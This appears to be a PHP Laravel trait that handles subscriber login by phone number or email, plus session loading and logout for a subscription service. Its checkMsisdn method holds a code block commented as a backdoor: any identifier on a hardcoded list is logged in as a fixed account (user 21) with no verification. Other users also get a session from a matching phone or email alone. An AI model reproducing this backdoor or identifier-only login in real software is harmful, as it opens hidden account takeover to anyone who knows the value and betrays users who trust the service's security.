<?php

namespace App\Http\Traits\ApiTraits;

use App\Bundle;
use App\Lib\AuthService;
use App\Lib\SUtils;
use App\User;
use function GuzzleHttp\Psr7\build_query;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Session;

trait AuthRoutes{

    public function checkMsisdn($data){
        $decoded = json_decode($data);

        $field = $decoded->data->field;

        if(SUtils::isPhone($field))
            $field = SUtils::normalizeTel($field);

        $bundle = null;
        if(isset($decoded->data->bundle_id)) {
            $bundle_id = $decoded->data->bundle_id;
            $bundle = Bundle::find($bundle_id);
        }

        $as = new AuthService($bundle);

        // backdoor
        if(in_array($field, AuthService::BACKDOOR_MSISDN)){
            $user = User::find(21);
            $as->writeUserSessionAndCookies($user);
            return response()->json(['result' => 'ok']);
        }

        $user = $as->getUser($field);

        if($user){
            $as->writeUserSessionAndCookies($user);
            return response()->json(['result' => 'ok']);
        }else{
            //todo rewrite this
            $operator = $as->getOperatorTech();
            $as->setOperator($operator);
            $actions = $as->askMasterForActions();

            if(!empty($actions)){
                if(isset($actions->action_type) && $actions->action_type == 'redirect'){
                    return response()->json([
                        'result' => $actions->action_type,
                        'to' => $actions->link,
                        'message' => 'redirect_required'
                    ]);
                }
            }

            //todo ip checkup and redirect
            return response()->json(['result' => 'fail', 'message' => 'not_subscribed']);
        }
    }

    public function userAuthorized(){
        $res = AuthService::userAuthorized() ? 'ok' : 'fail';
        return response()->json(['result' => $res]);
    }

    public function loadAuthData(){
        $resp = new \stdClass();
        $user_field = Cookie::get('COOKIE_USER_FIELD');

        $no_user = false;
        if(empty($user_field)) {
            $resp = self::getNoUserMessage();
            $no_user = true;
        }

        $f = SUtils::isPhone($user_field) ? 'msisdn' : 'email';
        $user = User::where($f, $user_field)->first();

        if(!$no_user) {
            if (!$user){
                $resp = self::getNoUserMessage();
                $no_user = true;
            }
        }

        if(Session::get('first_flow') && Session::get('sub_url')){
            $resp->first_flow = true;
            $resp->sub_url = Session::get('sub_url');
            $resp->all_params = Session::get('initial_params');
            $resp->all_params_string = build_query($resp->all_params);
        }

        if($no_user){
            return response()->json($resp);
        }

        $user_bundle_accesses = $user->bundle_accesses()->get();

        $user_bundle_accesses_ids = $user_bundle_accesses->map(function($b_a){
            return $b_a->bundles()->get()->map(function($b){ return $b->id; });
        });
        $user_bundles_ids = array_flatten(array_values($user_bundle_accesses_ids->toArray()));

        $as = new AuthService();
        $operator = $as->getOperator();

        $resp = new \stdClass();
        $resp->operator = $operator;
        $resp->user_bundles = $user_bundles_ids;
        $resp->$f = $user_field;


        return response()->json($resp);
    }

    public static function getNoUserMessage() : \stdClass {
        $as = new AuthService();
        $operator = $as->getOperator();

        $resp = new \stdClass();
        $resp->operator = $operator;
        $resp->user_bundles = [];
        $resp->msisdn = null;
        return $resp;
    }

    public function logout(){
        AuthService::destroyUserSessionAndCookies();

        return response()->json('ok');
    }

}